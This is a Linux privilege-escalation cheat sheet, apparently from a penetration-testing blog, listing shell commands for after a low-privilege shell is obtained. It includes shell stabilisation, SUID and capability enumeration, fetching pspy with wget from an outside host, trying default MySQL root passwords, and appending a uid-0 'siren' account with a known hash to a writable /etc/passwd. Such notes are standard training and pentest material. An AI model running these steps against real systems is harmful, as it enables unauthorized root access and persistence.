# Linux Privilege Escalation https://sirensecurity.io/blog/linux-privilege-escalation-resources/

# Just got a low privilege shell
python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200

# Various Capabilities
which gcc
which cc
which python
which perl
which wget  # File Transfer Capabilities 
which curl  # File Transfer Capabilities 
which fetch # File Transfer Capabilities 
which nc    # File Transfer Capabilities 
which ncat
which nc.traditional
which socat

# Background
uname -a
cat /etc/*-release
cat /etc/issue

# Are we a real user?
sudo -l
ls -lsaht /etc/sudoers

# Are we a member of any groups
id
groups <user>

# Look at shell environment variables
env

# Look at Home directory and look for SSH keys
cd /home/
ls -lsaht

# SUID / GUID Binaries (gtfobins)
find / -perm -u=s -type f 2>/dev/null # SUID
find / -perm -g=s -type f 2>/dev/null # GUID

# Get granted / implicit capabilities of all files recursively through system and pipe all error messages
# (ep) is effectively permitted or empty capability
getcap -r / 2>/dev/null

# Monitoring the system while performing enumeration https://github.com/DominicBreuker/pspy/blob/master/README.md
# Import either a 32 or 64 architecture specific one.
cd /var/tmp
wget http://192.168.0.0:80/pspy64 pspy64

# What does the local network look like? Look for dual homed NICs / routes
netstat -antup
netstat -tulnp
ifconfig
ip route
arp -a

# Is anything vulnerable running under root process wise?
ps aux | grep -i 'root' --color=auto

# MYSQL Credentials or ROOT unauthorized access? (enter password of 'root:root' or 'root:toor' or NO password.)
mysql -u root -p

# Look at /etc/ to see if any user-level people did special things
# Anything other than root here? Any config files left behind?
cd /etc/ | ls -lsaht
ls -lsaht | grep -i ‘.conf’ --color=auto
ls -lsaht | grep -i ‘.secret’ --color=auto

# Looking into other directories for information
ls -lsaht /var/lib/
ls -lsaht /var/db/
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
cd /var/
cd /var/mail


# NFS? Can we exploit weak NFS permissions?
cat /etc/exports # Does this contain 'no_root_squash'? https://recipeforroot.com/attacking-nfs-shares/

# Can we write / read to these files
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/group
# If you can write to /etc/passwd
openssl passwd -1
i<3hacking
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd
su siren
id

# Crontab
crontab –u root –l
cat /etc/crontab
ls -la /etc/cron*

# Bob is a user on this machine, show us every file he's ever created
find / -user bob 2>/dev/null
